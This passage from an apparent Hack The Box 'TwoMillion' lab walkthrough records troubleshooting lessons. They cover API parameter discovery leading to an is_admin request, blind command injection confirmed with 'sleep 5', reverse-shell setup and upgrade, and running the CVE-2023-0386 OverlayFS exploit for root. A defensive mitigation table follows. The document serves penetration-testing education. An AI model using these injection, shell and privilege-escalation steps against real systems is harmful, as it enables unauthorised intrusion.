```bash
curl -X PUT
```

---

## Lesson Learned

Always verify the required HTTP method during API testing.

REST APIs frequently use:

- GET
- POST
- PUT
- PATCH
- DELETE

Using the wrong method can completely change server behavior.

---

# Challenge 5 — Understanding API Error Messages

## Problem

The endpoint repeatedly returned:

```text
Missing parameter: email
```

followed by

```text
Missing parameter: is_admin
```

---

## Initial Assumption

These appeared to be ordinary validation errors.

---

## Investigation

Instead of treating them as failures, the responses were viewed as documentation.

Each error revealed another required parameter.

Eventually the complete request body was reconstructed.

---

## Solution

```json
{
    "email":"devdan@2million.htb",
    "is_admin":1
}
```

---

## Lesson Learned

Verbose API error messages frequently leak implementation details.

Carefully reading server responses often provides the information needed to reconstruct hidden API functionality.

---

# Challenge 6 — Confirming Command Injection

## Problem

Injecting commands such as:

```text
id

whoami
```

returned no visible output.

---

## Initial Assumption

The command injection might not exist.

---

## Investigation

Rather than abandoning the attack, a timing-based payload was used.

```text
sleep 5
```

The HTTP response consistently delayed by approximately five seconds.

---

## Solution

The timing difference confirmed **Blind Command Injection** without requiring command output.

---

## Lesson Learned

Never expect command output.

Blind command injection is commonly verified using:

- sleep
- ping
- DNS callbacks
- HTTP callbacks

Timing attacks are often the safest validation technique.

---

# Challenge 7 — Reverse Shell Failure

## Problem

The first reverse shell attempt failed with:

```text
Connection refused
```

---

## Root Cause

The payload mistakenly targeted the victim's IP address instead of the attacker's VPN address.

---

## Investigation

The VPN interface was inspected.

```bash
ip addr show tun0
```

This revealed the correct attacker address.

```text
10.10.x.x
```

---

## Solution

The reverse shell payload was updated to connect back to the attacker's VPN interface.

---

## Lesson Learned

Reverse shells always connect **from the victim to the attacker**.

Always verify:

- VPN IP
- Listener
- Port number

before troubleshooting the payload itself.

---

# Challenge 8 — Shell Upgrade Confusion

## Problem

While attempting to stabilize the shell, the command:

```bash
fg
```

returned:

```text
bash: fg: current: no such job
```

---

## Root Cause

The command was executed on the compromised host instead of the local Kali terminal.

---

## Correct Workflow

Target:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press:

```text
CTRL + Z
```

Back on Kali:

```bash
stty raw -echo
fg
```

Then:

```bash
export TERM=xterm
```

---

## Lesson Learned

Understand which commands execute locally and which execute remotely.

This distinction is essential when upgrading reverse shells.

---

# Challenge 9 — Git Clone Failure

## Problem

Attempting:

```bash
git clone https://github.com/...
```

failed on the target machine.

---

## Error

```text
Could not resolve host: github.com
```

---

## Investigation

The target machine had no Internet access.

---

## Solution

The exploit repository was downloaded on the Kali attacker machine and transferred to the target using:

```bash
scp
```

---

## Lesson Learned

Many penetration testing targets intentionally block outbound Internet access.

Always be prepared to transfer files manually.

---

# Challenge 10 — SCP Path Error

## Problem

The following command failed.

```bash
scp -r CVE-2023-0386 admin@2million.htb:/tmp/
```

---

## Root Cause

The command was executed while already inside the repository directory.

The specified folder no longer existed relative to the current working directory.

---

## Solution

Navigate back one directory before executing SCP.

```bash
cd ..
```

---

## Lesson Learned

Always verify the current working directory using:

```bash
pwd
```

before transferring files.

Simple path mistakes can consume unnecessary troubleshooting time.

---

# Challenge 11 — Understanding the OverlayFS Exploit

## Problem

After running:

```bash
./exp
```

the exploit appeared to finish successfully, but the first terminal remained blocked.

---

## Initial Assumption

The exploit appeared frozen.

---

## Investigation

This behavior was expected.

The first terminal maintained the FUSE filesystem while the second terminal executed the race condition.

---

## Solution

Leave Terminal 1 running and continue executing the remaining exploit steps in Terminal 2.

---

## Lesson Learned

Read the exploit workflow before assuming failure.

Many kernel exploits intentionally require multiple concurrent processes.

---

# Challenge 12 — Thinking the Exploit Had Not Worked

## Problem

After executing:

```bash
./gc
```

the shell displayed:

```text
To run a command as administrator...
```

This initially appeared to indicate failure.

---

## Investigation

The prompt had already changed.

```text
root@2million
```

Running:

```bash
whoami
```

returned:

```text
root
```

The exploit had already succeeded.

---

## Lesson Learned

Always verify privilege escalation using:

```bash
whoami

id
```

rather than relying solely on shell messages.

---

# Blue Team Perspective

Several defensive controls could have prevented the compromise.

| Weakness | Mitigation |
|----------|------------|
| Hidden API discovery | Remove unnecessary client-side functionality and restrict API exposure |
| Broken Access Control | Enforce server-side authorization checks |
| Verbose API errors | Return generic error messages |
| Command Injection | Avoid shell execution and validate input |
| Sensitive `.env` exposure | Restrict filesystem permissions and separate secrets from application code |
| Password Reuse | Enforce unique credentials and password management policies |
| Outdated Linux Kernel | Apply timely security patches |
| Unpatched GLIBC | Maintain a regular vulnerability management program |

---

# Skills Gained

Completing this machine strengthened practical experience in:

- Linux enumeration
- Virtual Host configuration
- JavaScript reverse engineering
- REST API enumeration
- HTTP request manipulation
- Cookie authentication
- Broken Access Control testing
- Blind Command Injection validation
- Reverse shell techniques
- Linux post-exploitation
- Credential harvesting
- Password reuse attacks
- SSH enumeration
- Mail enumeration
- Kernel vulnerability assessment
- Public exploit analysis
- OverlayFS privilege escalation

---

# Key Takeaways

- Enumeration is the foundation of successful penetration testing.
- Client-side JavaScript often exposes hidden functionality.
- Authentication does not guarantee proper authorization.
- API error messages can leak valuable implementation details.
- Blind command injection should be validated safely before attempting a reverse shell.
- Environment files frequently contain sensitive credentials.
- Password reuse significantly increases the impact of credential disclosure.
- Kernel exploits should only be attempted after simpler privilege escalation paths have been eliminated.
- Understanding *why* an exploit works is more valuable than simply executing it.

---

# References

- Hack The Box — TwoMillion
- OWASP Top 10 (2021)
- MITRE ATT&CK Framework
- CVE-2023-0386 — OverlayFS Local Privilege Escalation
- CVE-2023-4911 — Looney Tunables
- Linux OverlayFS Documentation
- GNU C Library Documentation

---

# Final Thoughts

TwoMillion is an outstanding beginner-friendly machine that demonstrates how a full compromise is rarely achieved through a single vulnerability. Instead, success comes from combining thorough enumeration, careful analysis, and disciplined exploitation.

Perhaps the most important lesson from this lab is that every obstacle encountered—whether it was misunderstanding an HTTP method, using the wrong VPN IP in a reverse shell, misinterpreting an API response, or troubleshooting a kernel exploit—became an opportunity to improve methodology. These small mistakes are a normal part of penetration testing, and systematically identifying their root causes is what transforms a checklist-driven approach into genuine technical understanding.

Ultimately, this machine reinforces a fundamental principle of offensive security:

> **Great penetration testers are not defined by how quickly they exploit a vulnerability, but by how effectively they observe, reason, adapt, and learn throughout the entire attack chain.**